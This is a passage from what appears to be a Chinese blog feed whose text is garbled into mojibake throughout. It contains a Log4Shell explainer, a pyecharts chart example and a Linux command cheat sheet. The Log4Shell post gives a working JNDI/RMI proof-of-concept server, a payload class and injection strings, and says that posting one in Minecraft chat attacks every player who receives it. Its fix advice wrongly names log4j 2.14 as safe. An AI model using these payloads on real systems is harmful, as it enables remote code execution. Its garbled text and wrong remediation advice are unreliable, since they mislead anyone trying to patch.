ä»è¿œç¨‹æœåŠ¡å™¨è·å–çš„ java å¯¹è±¡ã€‚è¿œç¨‹æœåŠ¡å™¨çš„åœ°å€å³Â â€œrmi//127.0.0.1:1099â€ï¼Œè€Œæä¾›çš„å¯¹è±¡åˆ™æ˜¯ â€œheikeâ€ï¼Œâ€heikeâ€ ä¸€èˆ¬æ˜¯ä¸€ä¸ªJava Classã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦ä½ çš„æ—¥å¿—é‡Œé¢åŒ…å« â€œ${jndi:rmi//127.0.0.1:1099/heike}â€ è¿™ä¸€æ®µä¿¡æ¯ï¼Œä½ å°±å¯èƒ½ä¼šè¢«é»‘å®¢å…¥ä¾µï¼Œæ˜¯ä¸æ˜¯æœ‰ç‚¹ sqlÂ æ³¨å…¥çš„å‘³é“äº†ï¼Ÿä¾‹å¦‚æˆ‘çš„ä¸–ç•Œä¹Ÿä½¿ç”¨äº† log4jï¼Œä»–ä¼šç”¨ log4j æŠŠå…¶ä»–ç©å®¶è¯´çš„è¯é€šè¿‡ logger.info(ç©å®¶è¯´çš„è¯) è®°å½•ä¸‹æ¥ï¼Œå¦‚æœä»–è¯´äº†ä¸€äº›å¯ä»¥è§¦å‘ log4j å ä½ç¬¦æœºåˆ¶ä¸”ä¸æ€€å¥½æ„çš„è¯ï¼Œæ‰€æœ‰å¬åˆ°è¿™å¥è¯çš„ç©å®¶éƒ½å¾—ä¸­æ‹›ï¼Œè¿è¡Œè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ Java ä»£ç ã€‚<br>â€‹</p><p>Â  Â  æˆ‘è¿™ä¹ˆè¯´å¯èƒ½æœ‰ç‚¹ç»•äº†ï¼Œæ‰€ä»¥å„ä½èµ„æ·± Java ç©å®¶å¯ä»¥ç›´æ¥çœ‹å…·ä½“ä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4jServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;me.faintcloudy.Heike&quot;</span>, <span class="string">&quot;me.faintcloudy.Heike&quot;</span>, <span class="string">&quot;http://127.0.0.1:1010/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;heike&quot;</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Log4jServer.class (æœåŠ¡ç«¯, é»‘å®¢)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Heike</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    JOptionPane.showConfirmDialog(<span class="keyword">null</span>, <span class="string">&quot;ä½ çš„ç”µè„‘å·²ç»è¢«æˆ‘å…¥ä¾µäº†ï¼ï¼ï¼&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Heike.class (æœåŠ¡ç«¯, é»‘å®¢)<br>â€‹</p><p>Â  Â  ä»¥ä¸Šæ˜¯é»‘å®¢æœåŠ¡å™¨ä¸Šè¿è¡Œçš„ä»£ç ã€‚æ‰€ä»¥åªéœ€è¦ä½ ç”µè„‘ä¸ŠæŸä¸ª Java ç¨‹åºè¿è¡Œä»¥ä¸‹ä»£ç :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String log = <span class="string">&quot;$&#123;jndi:rmi//127.0.0.1:1099/heike&#125;&quot;</span>;</span><br><span class="line">logger.info(log);</span><br></pre></td></tr></table></figure><p>Â Â Â Â æ­¤å¤„çš„ â€œlogâ€ å¯ä»¥æ˜¯ç©å®¶è¯´çš„è¯ï¼Œæ˜µç§°ç­‰ï¼Œä¸éœ€è¦ç¨‹åºç‰¹å®šè¿™ä¹ˆå†™ã€‚<br>â€‹</p><p>Â  Â  å°±ä¼šå‡ºç°å¦‚ä¸‹çŠ¶å†µ:<br><img src="https://snowgo.top/medias/medias/Log4j%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/0.png"><br>è¢«é»‘å®¢å…¥ä¾µ (æ‰§è¡Œäº† Heike.class)<br>â€‹</p><p>Â  Â  è¿™ä»…ä»…æ˜¯æ‰“å¼€äº†ä¸€ä¸ªä¿¡æ¯æ¡†ï¼Œä½†å®é™…ä¸Šé»‘å®¢å¯ä»¥å¾€ Heike.class æ”¾ä»»ä½•ä»£ç ï¼Œåœ¨ä¸ç»æ„é—´ä½¿ä½ çš„ç”µè„‘æŠ¥åºŸæˆ–æ‰€æœ‰è´¦å·å…¨è¢«å·èµ°ã€‚</p><h3 id="æˆ‘çš„ä¸–ç•ŒJAVAç‰ˆæ”»å‡»"><a href="#æˆ‘çš„ä¸–ç•ŒJAVAç‰ˆæ”»å‡»" class="headerlink" title="æˆ‘çš„ä¸–ç•ŒJAVAç‰ˆæ”»å‡»"></a>æˆ‘çš„ä¸–ç•ŒJAVAç‰ˆæ”»å‡»</h3><p>ç‰¹åˆ«æ˜¯æˆ‘çš„ä¸–ç•ŒJAVAç‰ˆæœ¬ä¸­ï¼Œæ”»å‡»æ–¹æ³•è¶…çº§ç®€å•ï¼Œåœ¨æ¸¸æˆçš„åœ¨çº¿èŠå¤©ä¸­ï¼Œå‘é€ä¸€æ¡å¸¦æ¼æ´è§¦å‘æŒ‡ä»¤çš„æ¶ˆæ¯ï¼Œç±»ä¼¼<br>â€œ${jndi:ldap://{}.<a href="http://xxxxxxxxxxxxxx}â€,å°±å¯ä»¥å¯¹æ”¶åˆ°è¿™æ¡æ¶ˆæ¯çš„ç”¨æˆ·å‘èµ·æ”»å‡»./">http://xxxxxxxxxxxxxx}â€,å°±å¯ä»¥å¯¹æ”¶åˆ°è¿™æ¡æ¶ˆæ¯çš„ç”¨æˆ·å‘èµ·æ”»å‡»ã€‚</a></p><h2 id="å¦‚ä½•è§£å†³ï¼Ÿ"><a href="#å¦‚ä½•è§£å†³ï¼Ÿ" class="headerlink" title="å¦‚ä½•è§£å†³ï¼Ÿ"></a>å¦‚ä½•è§£å†³ï¼Ÿ</h2><p>â€‹</p><p>Â  Â  å…ˆä¸è¦æ…Œï¼Œå¦‚æœä½ ä½¿ç”¨äº† Java 8 æˆ–ä»¥ä¸Šç‰ˆæœ¬ï¼ŒåŸºæœ¬å¯¹ä½ æ²¡æœ‰ä»€ä¹ˆå±å®³ã€‚å› ä¸ºåœ¨ Java 8 ä¸­æ·»åŠ äº†ä¸€ä¸ªæ–°çš„å±æ€§Â com.sun.jndi.rmi.object.trustURLCodebaseï¼Œè¿™æ˜¯ä¸€ä¸ª boolean ç±»å‹ã€‚é»˜è®¤å€¼æ˜¯ falseï¼Œåœ¨ä½¿ç”¨ jndi æ—¶ä¼šæŠ›å‡ºä¸€ä¸ªæŠ¥é”™é˜»æ­¢åŠ è½½è¿œç¨‹æœåŠ¡å™¨æä¾›çš„ä»£ç ã€‚å½“ç„¶æœ€å¥½è¿˜æ˜¯åšä¸€ä¸‹é˜²å¤‡ï¼Œæ¯•ç«Ÿè°ä¹Ÿè¯´ä¸å‡†å‘¢ã€‚<br>â€‹</p><ul><li>Â  Â Â Â æ·»åŠ  jvm å‚æ•° -Dlog4j2.FORMATMsgNoLookups=trueï¼Œä»–çš„ä½œç”¨æ˜¯ä¸è®© log4j æ›¿æ¢å ä½ç¬¦</li><li>Â  Â Â  åˆ›å»º â€œlog4j2.component.propertiesâ€ æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­åŠ å…¥â€log4j2.formatMsgNoLookups=trueâ€</li><li>Â  Â  Â åˆ é™¤ log4j-core-*.jar ä¸­ org/apache/logging/log4j/core/lookup/JndiLookup.class è¿™ä¸ªæ–‡ä»¶ï¼Œå½»åº•è¿›è¡Œä¸äº† jndi</li><li>Â  Â  Â æ›´æ–° log4j åˆ°æœ€æ–°ç‰ˆæœ¬ 2.14 åŠä»¥ä¸Š</li><li>Â  Â  Â æœ€æœ€æœ€å½»åº•: æ–­ç½‘<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2>â€‹</li></ul><p>Â  Â  æœ¬äººèµ„å†æœ‰é™ï¼Œæ–‡ç« ä¸­å¤šæœ‰é”™è¯¯ä¸ä¸è¶³ï¼Œå¸Œæœ›å„ä½å¤§ä½¬å¤šå¤šæå‡ºå»ºè®®ä¸æ„è§ã€‚æ„Ÿè°¢å¤§å®¶çš„æ”¯æŒï¼Œè¿˜è¯·ç•™ä¸‹ä¸€ä¸ªå°å°çš„è½¬å‘ã€‚<br>â€‹</p><p>Â  Â  å®Œã€‚</p><blockquote><p> ä½œè€…ï¼šFaintCloudy <a href="https://www.bilibili.com/read/cv14380391">https://www.bilibili.com/read/cv14380391</a><br> ä½œè€…:  è€æ–œèŠç§‘æŠ€   <a href="https://baijiahao.baidu.com/s?id=1718941062294956461&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1718941062294956461&amp;wfr=spider&amp;for=pc</a></p></blockquote><p><a href="https://baijiahao.baidu.com/s?id=1718941062294956461&wfr=spider&for=pc"></a></p>]]></content>
      
      
      <categories>
          
          <category> INTERESTING </category>
          
      </categories>
      
      
        <tags>
            
            <tag> interesting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å’Œé²¸è®­ç»ƒè¥-å•†ä¸šæ•°æ®å¯è§†åŒ–</title>
      <link href="/2021/12/04/%E5%92%8C%E9%B2%B8%E8%AE%AD%E7%BB%83%E8%90%A5-%E5%95%86%E4%B8%9A%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/"/>
      <url>/2021/12/04/%E5%92%8C%E9%B2%B8%E8%AE%AD%E7%BB%83%E8%90%A5-%E5%95%86%E4%B8%9A%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">x_data = [<span class="string">&#x27;2021-08-01&#x27;</span>, <span class="string">&#x27;2021-08-02&#x27;</span>, <span class="string">&#x27;2021-08-03&#x27;</span>, <span class="string">&#x27;2021-08-04&#x27;</span>, <span class="string">&#x27;2021-08-05&#x27;</span>, <span class="string">&#x27;2021-08-06&#x27;</span>, <span class="string">&#x27;2021-08-07&#x27;</span>, <span class="string">&#x27;2021-08-08&#x27;</span>, <span class="string">&#x27;2021-08-09&#x27;</span>, </span><br><span class="line">          <span class="string">&#x27;2021-08-10&#x27;</span>, <span class="string">&#x27;2021-08-11&#x27;</span>, <span class="string">&#x27;2021-08-12&#x27;</span>, <span class="string">&#x27;2021-08-13&#x27;</span>, <span class="string">&#x27;2021-08-14&#x27;</span>, <span class="string">&#x27;2021-08-15&#x27;</span>, <span class="string">&#x27;2021-08-16&#x27;</span>, <span class="string">&#x27;2021-08-17&#x27;</span>, <span class="string">&#x27;2021-08-18&#x27;</span>, </span><br><span class="line">          <span class="string">&#x27;2021-08-19&#x27;</span>, <span class="string">&#x27;2021-08-20&#x27;</span>, <span class="string">&#x27;2021-08-21&#x27;</span>, <span class="string">&#x27;2021-08-22&#x27;</span>, <span class="string">&#x27;2021-08-23&#x27;</span>, <span class="string">&#x27;2021-08-24&#x27;</span>, <span class="string">&#x27;2021-08-25&#x27;</span>, <span class="string">&#x27;2021-08-26&#x27;</span>, <span class="string">&#x27;2021-08-27&#x27;</span>, </span><br><span class="line">          <span class="string">&#x27;2021-08-28&#x27;</span>, <span class="string">&#x27;2021-08-29&#x27;</span>, <span class="string">&#x27;2021-08-30&#x27;</span>, <span class="string">&#x27;2021-08-31&#x27;</span>]</span><br><span class="line"><span class="comment"># ç³»åˆ—1çš„æ•°æ®</span></span><br><span class="line">y_data_1 = [<span class="number">71</span>, <span class="number">77</span>, <span class="number">79</span>, <span class="number">110</span>, <span class="number">61</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">61</span>, <span class="number">112</span>, <span class="number">61</span>, <span class="number">87</span>, <span class="number">55</span>, <span class="number">106</span>, <span class="number">62</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">64</span>, <span class="number">69</span>, <span class="number">78</span>, <span class="number">56</span>, <span class="number">65</span>, <span class="number">77</span>, <span class="number">87</span>, <span class="number">117</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">81</span>, <span class="number">79</span>]</span><br><span class="line"><span class="comment"># ç³»åˆ—2çš„æ•°æ®</span></span><br><span class="line">y_data_2 = [<span class="number">22</span>, <span class="number">18</span>, <span class="number">48</span>, <span class="number">18</span>, <span class="number">27</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">3</span>, <span class="number">48</span>, <span class="number">72</span>, <span class="number">39</span>, <span class="number">80</span>, <span class="number">44</span>]</span><br><span class="line"><span class="comment"># æ–°å»ºä¸€ä¸ªLineå®ä¾‹ï¼Œå‘½åä¸ºchart</span></span><br><span class="line">chart = Line()</span><br><span class="line"></span><br><span class="line">chart.set_global_opts(</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    legend_opts=opts.LegendOpts(</span><br><span class="line">        selected_mode=<span class="string">&#x27;multiple&#x27;</span>,  <span class="comment"># è®¾ç½®ä¸ºå•é€‰ï¼Œå¤šé€‰=&gt;multiple</span></span><br><span class="line">        pos_right=<span class="string">&#x27;10%&#x27;</span>,  <span class="comment"># è·ç¦»å³è¾¹ç•Œè·ç¦»</span></span><br><span class="line">        pos_top=<span class="string">&#x27;2%&#x27;</span>,  <span class="comment"># è·ç¦»ä¸Šè¾¹ç•Œçš„è·ç¦»</span></span><br><span class="line">        <span class="comment"># orient=&#x27;vertical&#x27;,  # è®¾ç½®è¯¶å‚ç›´å¸ƒå±€ï¼Œé»˜è®¤æ°´å¹³å¸ƒå±€=&gt;horizontal</span></span><br><span class="line">        legend_icon=<span class="string">&#x27;circle&#x27;</span>,  <span class="comment"># ä¿®æ”¹å›¾ä¾‹icon</span></span><br><span class="line">        textstyle_opts=opts.TextStyleOpts(</span><br><span class="line">            color=<span class="string">&#x27;red&#x27;</span>,  <span class="comment"># é¢œè‰²</span></span><br><span class="line">            font_size=<span class="string">&#x27;12&#x27;</span>,   <span class="comment"># å­—ä½“å¤§å°</span></span><br><span class="line">            font_weight=<span class="string">&#x27;bolder&#x27;</span>,   <span class="comment"># åŠ ç²—</span></span><br><span class="line">        )  <span class="comment"># æ–‡æœ¬æ ·å¼é…ç½®</span></span><br><span class="line">        ),</span><br><span class="line">  </span><br><span class="line">    title_opts=opts.TitleOpts(</span><br><span class="line">        title=<span class="string">&quot;å±…ä¸­æ ‡é¢˜&quot;</span>,   <span class="comment"># ä¸»æ ‡é¢˜å†…å®¹</span></span><br><span class="line">        <span class="comment"># subtitle=&#x27;æˆ‘æ˜¯å‰¯æ ‡é¢˜ï¼Œç¨å¾®é•¿ä¸€ç‚¹å†é•¿ä¸€ç‚¹ã€ç‚¹æˆ‘ä¹Ÿä¼šè·³è½¬ã€‘&#x27;,  # å‰¯æ ‡é¢˜å†…å®¹</span></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        title_target=<span class="string">&#x27;blank&#x27;</span>,  <span class="comment"># æ–°å»ºçª—å£æ‰“å¼€é“¾æ¥</span></span><br><span class="line">        title_link=<span class="string">&#x27;http://www.baidu.com&#x27;</span>,  <span class="comment"># ä¸»æ ‡é¢˜é“¾æ¥</span></span><br><span class="line">        subtitle_link=<span class="string">&#x27;http://www.heywale.com&#x27;</span>,  <span class="comment"># å‰¯æ ‡é¢˜é“¾æ¥</span></span><br><span class="line">        subtitle_target=<span class="string">&#x27;self&#x27;</span>,  <span class="comment"># å½“å‰çª—å£æ‰“å¼€</span></span><br><span class="line">        pos_left=<span class="string">&#x27;center&#x27;</span>,  <span class="comment"># è·ç¦»å·¦è¾¹ç•Œè·ç¦»ï¼Œcenterè¡¨ç¤ºå‰§ä¸­</span></span><br><span class="line">        pos_top=<span class="string">&#x27;5%&#x27;</span>,  <span class="comment"># è·ç¦»ä¸Šè¾¹ç•Œè·ç¦»</span></span><br><span class="line">        item_gap=<span class="number">20</span>,  <span class="comment"># ä¸»å‰¯æ ‡é¢˜ä¹‹é—´è·ç¦»</span></span><br><span class="line">        title_textstyle_opts=opts.TextStyleOpts(color=<span class="string">&quot;white&quot;</span>,         <span class="comment"># ä¸»æ ‡é¢˜é¢œè‰²</span></span><br><span class="line">        font_size=<span class="number">20</span></span><br><span class="line">        ,font_weight=<span class="string">&quot;bold&quot;</span>  <span class="comment"># å­—ä½“åŠ ç²—&quot;</span></span><br><span class="line">         )</span><br><span class="line">        ),</span><br><span class="line">         datazoom_opts=opts.DataZoomOpts(</span><br><span class="line">        range_start=<span class="number">0</span>,  <span class="comment"># å¼€å§‹èŒƒå›´</span></span><br><span class="line">        range_end=<span class="number">50</span>,  <span class="comment"># ç»“æŸèŒƒå›´</span></span><br><span class="line">        <span class="comment"># orient=&#x27;vertical&#x27;,  # è®¾ç½®ä¸ºå‚ç›´å¸ƒå±€</span></span><br><span class="line">        type_=<span class="string">&#x27;slider&#x27;</span>,  <span class="comment"># sliderå½¢å¼</span></span><br><span class="line">        is_zoom_lock=<span class="literal">True</span>,  <span class="comment"># é”å®šåŒºåŸŸå¤§å°</span></span><br><span class="line">        pos_left=<span class="string">&#x27;1%&#x27;</span>  <span class="comment"># è®¾ç½®ä½ç½®</span></span><br><span class="line">        ),</span><br><span class="line">       </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸ºchartæ·»åŠ xè½´çš„æ•°æ®</span></span><br><span class="line">chart.add_xaxis(x_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸ºchartæ·»åŠ yè½´çš„æ•°æ®</span></span><br><span class="line">chart.add_yaxis(<span class="string">&#x27;ç³»åˆ—ä¸€&#x27;</span>, y_data_1,linestyle_opts=opts.LineStyleOpts(color=<span class="string">&quot;red&quot;</span>, width=<span class="number">4</span>, type_=<span class="string">&quot;dotted&quot;</span>),areastyle_opts=opts.AreaStyleOpts(opacity=<span class="number">0.6</span>))</span><br><span class="line">chart.add_yaxis(<span class="string">&#x27;ç³»åˆ—äºŒ&#x27;</span>, y_data_2,linestyle_opts=opts.LineStyleOpts(color=<span class="string">&quot;pink&quot;</span>, width=<span class="number">4</span>, type_=<span class="string">&quot;dotted&quot;</span>),areastyle_opts=opts.AreaStyleOpts(opacity=<span class="number">0.3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨notebooä¸­å¤¹åœ¨å›¾è¡¨</span></span><br><span class="line"><span class="comment"># å¦‚æœæ˜¯åœ¨Pycharmç­‰IDEä¸­ ä½¿ç”¨charts.render(&quot;xxx.html&quot;)</span></span><br><span class="line">chart.render_notebook()</span><br></pre></td></tr></table></figure><p><img src="https://snowgo.top/medias/medias/%E5%92%8C%E9%B2%B8%E8%AE%AD%E7%BB%83%E8%90%A5-%E5%95%86%E4%B8%9A%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/0.png"></p>]]></content>
      
      
      <categories>
          
          <category> DataAnalysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pyecharts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤§æ•°æ®æ¡†æ¶å‘½ä»¤(çº¯å‡€ç‰ˆ)</title>
      <link href="/2021/11/28/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%A1%86%E6%9E%B6%E5%91%BD%E4%BB%A4(%E7%BA%AF%E5%87%80%E7%89%88)/"/>
      <url>/2021/11/28/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%A1%86%E6%9E%B6%E5%91%BD%E4%BB%A4(%E7%BA%AF%E5%87%80%E7%89%88)/</url>
      
        <content type="html"><![CDATA[<h2 id="Linuxï¼ˆvi-vimï¼‰"><a href="#Linuxï¼ˆvi-vimï¼‰" class="headerlink" title="Linuxï¼ˆvi/vimï¼‰"></a>Linuxï¼ˆvi/vimï¼‰</h2><h3 id="ä¸€èˆ¬æ¨¡å¼"><a href="#ä¸€èˆ¬æ¨¡å¼" class="headerlink" title="ä¸€èˆ¬æ¨¡å¼"></a>ä¸€èˆ¬æ¨¡å¼</h3><table><thead><tr><th>è¯­æ³•</th><th>åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td>yy</td><td>å¤åˆ¶å…‰æ ‡å½“å‰ä¸€è¡Œ</td></tr><tr><td>yæ•°å­—y</td><td>å¤åˆ¶ä¸€æ®µï¼ˆä»ç¬¬å‡ è¡Œåˆ°ç¬¬å‡ è¡Œï¼‰</td></tr><tr><td>p</td><td>ç®­å¤´ç§»åŠ¨åˆ°ç›®çš„è¡Œç²˜è´´</td></tr><tr><td>u</td><td>æ’¤é”€ä¸Šä¸€æ­¥</td></tr><tr><td>dd</td><td>åˆ é™¤å…‰æ ‡å½“å‰è¡Œ</td></tr><tr><td>dæ•°å­—d</td><td>åˆ é™¤å…‰æ ‡ï¼ˆå«ï¼‰åå¤šå°‘è¡Œ</td></tr><tr><td>x</td><td>åˆ é™¤ä¸€ä¸ªå­—æ¯ï¼Œç›¸å½“äºdel</td></tr><tr><td>X</td><td>åˆ é™¤ä¸€ä¸ªå­—æ¯ï¼Œç›¸å½“äºBackspace</td></tr><tr><td>yw</td><td>å¤åˆ¶ä¸€ä¸ªè¯</td></tr><tr><td>dw</td><td>åˆ é™¤ä¸€ä¸ªè¯</td></tr><tr><td>shift+^</td><td>ç§»åŠ¨åˆ°è¡Œå¤´</td></tr><tr><td>shift+$</td><td>ç§»åŠ¨åˆ°è¡Œå°¾</td></tr><tr><td>1+shift+g</td><td>ç§»åŠ¨åˆ°é¡µå¤´ï¼Œæ•°å­—</td></tr><tr><td>shift+g</td><td>ç§»åŠ¨åˆ°é¡µå°¾</td></tr><tr><td>æ•°å­—N+shift+g</td><td>ç§»åŠ¨åˆ°ç›®æ ‡è¡Œ</td></tr></tbody></table><h3 id="ç¼–è¾‘æ¨¡å¼"><a href="#ç¼–è¾‘æ¨¡å¼" class="headerlink" title="ç¼–è¾‘æ¨¡å¼"></a>ç¼–è¾‘æ¨¡å¼</h3><table><thead><tr><th>æŒ‰é”®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>i</td><td>å½“å‰å…‰æ ‡å‰</td></tr><tr><td>a</td><td>å½“å‰å…‰æ ‡å</td></tr><tr><td>o</td><td>å½“å‰å…‰æ ‡è¡Œçš„ä¸‹ä¸€è¡Œ</td></tr><tr><td>I</td><td>å…‰æ ‡æ‰€åœ¨è¡Œæœ€å‰</td></tr><tr><td>A</td><td>å…‰æ ‡æ‰€åœ¨è¡Œæœ€å</td></tr><tr><td>O</td><td>å½“å‰å…‰æ ‡è¡Œçš„ä¸Šä¸€è¡Œ</td></tr></tbody></table><h3 id="æŒ‡ä»¤æ¨¡å¼"><a href="#æŒ‡ä»¤æ¨¡å¼" class="headerlink" title="æŒ‡ä»¤æ¨¡å¼"></a>æŒ‡ä»¤æ¨¡å¼</h3><table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>:w</td><td>ä¿å­˜</td></tr><tr><td>:q</td><td>é€€å‡º</td></tr><tr><td>:!</td><td>å¼ºåˆ¶æ‰§è¡Œ</td></tr><tr><td>/è¦æŸ¥æ‰¾çš„è¯</td><td>n æŸ¥æ‰¾ä¸‹ä¸€ä¸ªï¼ŒN å¾€ä¸ŠæŸ¥æ‰¾</td></tr><tr><td>? è¦æŸ¥æ‰¾çš„è¯</td><td>næ˜¯æŸ¥æ‰¾ä¸Šä¸€ä¸ªï¼Œshift+næ˜¯å¾€ä¸‹æŸ¥æ‰¾</td></tr><tr><td>:set nu</td><td>æ˜¾ç¤ºè¡Œå·</td></tr><tr><td>:set nonu</td><td>å…³é—­è¡Œå·</td></tr></tbody></table><h3 id="å‹ç¼©å’Œè§£å‹"><a href="#å‹ç¼©å’Œè§£å‹" class="headerlink" title="å‹ç¼©å’Œè§£å‹"></a>å‹ç¼©å’Œè§£å‹</h3><h4 id="gzip-gunzip-å‹ç¼©"><a href="#gzip-gunzip-å‹ç¼©" class="headerlink" title="gzip/gunzip å‹ç¼©"></a>gzip/gunzip å‹ç¼©</h4><p>ï¼ˆ1ï¼‰åªèƒ½å‹ç¼©æ–‡ä»¶ä¸èƒ½å‹ç¼©ç›®å½•</p><p>ï¼ˆ2ï¼‰ä¸ä¿ç•™åŸæ¥çš„æ–‡ä»¶</p><p>gzipå‹ç¼©ï¼šgzip hello.txt</p><p>gunzipè§£å‹ç¼©æ–‡ä»¶ï¼šgunzip hello.txt.gz</p><h4 id="zip-unzip-å‹ç¼©"><a href="#zip-unzip-å‹ç¼©" class="headerlink" title="zip/unzip å‹ç¼©"></a>zip/unzip å‹ç¼©</h4><p>å¯ä»¥å‹ç¼©ç›®å½•ä¸”ä¿ç•™æºæ–‡ä»¶</p><p>zipå‹ç¼©ï¼ˆå‹ç¼© 1.txt å’Œ2.txtï¼Œå‹ç¼©åçš„åç§°ä¸ºmypackage.zipï¼‰ï¼šzip hello.zip hello.txt world.txt</p><p>unzipè§£å‹ï¼šunzip hello.zip</p><p>unzipè§£å‹åˆ°æŒ‡å®šç›®å½•ï¼šunzip hello.zip -d /opt</p><h4 id="tar-æ‰“åŒ…"><a href="#tar-æ‰“åŒ…" class="headerlink" title="tar æ‰“åŒ…"></a>tar æ‰“åŒ…</h4><p>tarå‹ç¼©å¤šä¸ªæ–‡ä»¶ï¼štar -zcvf hello.txt world.txt</p><p>tarå‹ç¼©ç›®å½•ï¼štar -zcvf hello.tar.gz opt/</p><p>tarè§£å‹åˆ°å½“å‰ç›®å½•ï¼štar -zxvf hello.tar.gz</p><p>tarè§£å‹åˆ°æŒ‡å®šç›®å½•ï¼štar -zxvf hello.tar.gz -C /opt</p><h3 id="RPM"><a href="#RPM" class="headerlink" title="RPM"></a>RPM</h3><p>RPMæŸ¥è¯¢å‘½ä»¤ï¼šrpm -qa |grep firefox</p><p>RPMå¸è½½å‘½ä»¤ï¼š</p><p>rpm -e xxxxxx</p><p>rpm -e â€“nodeps xxxxxxï¼ˆä¸æ£€æŸ¥ä¾èµ–ï¼‰</p><p>RPMå®‰è£…å‘½ä»¤ï¼š</p><p>rpm -ivh xxxxxx.rpm</p><p>rpm -ivh â€“nodeps 